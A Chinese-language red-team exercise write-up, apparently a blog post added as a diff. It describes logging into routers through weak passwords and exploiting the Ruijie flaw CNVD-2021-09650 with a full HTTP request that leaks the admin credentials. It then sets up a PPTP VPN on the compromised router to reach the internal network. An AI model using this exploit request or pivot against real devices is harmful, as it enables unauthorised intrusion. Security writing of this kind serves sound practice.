@@ -1,0 +1,98 @@
+## 一、利用弱口令进网络设备
+
+弱口令yyds，这是这次攻防演练第二个惊喜，在扫目标的C段IP的时候发现五个网络设备，有三个路由器、一个web管理系统和一台虚拟专用网络设备，看起来版本都比较旧就想着先去找找版本漏洞，试了试都没登陆进去，就抱着侥幸心理去试试弱口令，没想到这网络设备居然也有弱口令，进去了两个弱口令和一个web管理系统。
+
+后续会继续为大家分享各系列比如hvv实战经验、知识总结的文章，欢迎大家来关注我们的公众号“浪飒sec”。![](https://image.3001.net/images/20220906/1662451139_6316fdc3736ca8d77ff9b.png!small)
+
+![](https://image.3001.net/images/20220906/1662451148_6316fdccc85df5d66c433.png!small)
+
+![](https://image.3001.net/images/20220906/1662451157_6316fdd50f73d536f48e6.png!small)
+
+![](https://image.3001.net/images/20220906/1662451165_6316fddd2f91e4e6b74e6.png!small)
+
+不过另外一个web管理系统的弱口令不是管理员权限，逛了半天没啥功能，这里就不截图了。我们知道网络设备一般都是会连接办公网的，像路由器这种都是有搭建虚拟专用网络的功能的，有PPTP、IPsec和L2TP三种模式，本次我是使用PPTP搭建虚拟专用网络进内网的。
+
+## 二、利用CNVD-2021-09650获取web管理系统管理员权限
+
+因为web管理系统没有获取管理员权限，就想着能不能提升波权限，想起前段时间锐捷路由器的一个CNVD，尝试看看这个web管理系统存不存在这个CNVD漏洞。
+
+构造数据包，返回账户密码
+
+    
+    
+    POST /WEB_VMS/LEVEL15/ HTTP/1.1
+    
+    Host: xxx.xxx.xxx.xxx
+    
+    User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:104.0) Gecko/20100101 Firefox/104.0
+    
+    Accept: */*
+    
+    Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
+    
+    Accept-Encoding: gzip, deflate
+    
+    Authorization: Basic Z3Vlc3Q6Z3Vlc3Q=
+    
+    Content-Type: text/plain;charset=UTF-8
+    
+    Content-Length: 80
+    
+    Origin: http:// xxx.xxx.xxx.xxx
+    
+    Connection: close
+    
+    Referer: http:// xxx.xxx.xxx.xxx /index.htm
+    
+    Cookie: auth=Z3Vlc3Q6Z3Vlc3Q%3D; user=guest; currentURL=
+    
+     
+    
+    command=show webmaster user&strurl=exec%04&mode=%02PRIV_EXEC&signname=Red-Giant.
+
+![](https://image.3001.net/images/20220906/1662451247_6316fe2f48c111934c9ba.png!small)
+
+返回账户名密码，利用admin账户登陆成功。
+
+## 三、利用锐捷路由器搭建PPTP进内网
+
+来到路由器这里开启 PPTP 服务（公网ip）并且添加一个 PPTP 账号
+
+![](https://image.3001.net/images/20220906/1662451257_6316fe39f28994f37b270.png!small)
+
+之后在自己的电脑上建立一个虚拟专用网络 ，我的电脑是win11，win10以及以下版本可能会有些许差别。打开控制面板->网络和共享中心，设置新的连接和网络
+
+![](https://image.3001.net/images/20220906/1662451385_6316feb9c40739498bbdf.png!small)
+
+连接到工作区
+
+![](https://image.3001.net/images/20220906/1662451376_6316feb0584be2d2f938f.png!small)
+
+选择连接虚拟专用网络，输入刚刚锐捷路由器的公网IP，下一步填入设置好的PPTP账户密码
+
+![](https://image.3001.net/images/20220906/1662451366_6316fea67ddd0a4f4d5fe.png!small)![](https://image.3001.net/images/20220906/1662451360_6316fea03e037a8654635.png!small)
+
+然后去网络适配器，发现会多出一个虚拟专用网络，右键点击属性
+
+![](https://image.3001.net/images/20220906/1662451348_6316fe94dbcfabef2d8c0.png!small)
+
+像图中这样设置
+
+![](https://image.3001.net/images/20220906/1662451341_6316fe8d71ebcfb530001.png!small)
+
+然后连接虚拟专用网络，成功进入内网
+
+![](https://image.3001.net/images/20220906/1662451333_6316fe85c91b77c36e629.png!small)
+
+这里需要注意一点，如果虚拟专用网络连接上后自己的网络断了虚拟专用网络属性里的在远程网络上使用默认网关选项不勾选就可以了，刚开始我的网就是老断，折腾了半天才整明白。
+
+![](https://image.3001.net/images/20220906/1662451325_6316fe7dd4e7c6ff3047e.png!small)
+
+进内网那剩下的就是扫IP、横向等内网渗透的常规思路了，由于内网东西太多，图片全是码，这里就不再讲了，后续有机会再和大家分享分享内网渗透。
+
+## 总结
+
+攻防演练中网络设备的权限得分比网站权限的高，就是因为拿到网络设备比较容易进内网。就像本次案例，利用路由器创建PPTP搭建虚拟专用网络进内网，可以说拿下网络设备的权限就等于进内网成功了一半。但是拿下网络设备的权限却没那么容易，这次是瞎猫碰到死耗子出现了弱口令，一般情况下大家可以去根据登陆面板或者源代码下去判断网络设备的版本，然后去漏洞库查询相应的版本漏洞进行渗透。
+
+后续会继续为大家分享各系列比如hvv实战经验、知识总结的文章，欢迎大家来关注我们的公众号“浪飒sec”，这里有我们自己搭建的漏洞库哦。
+
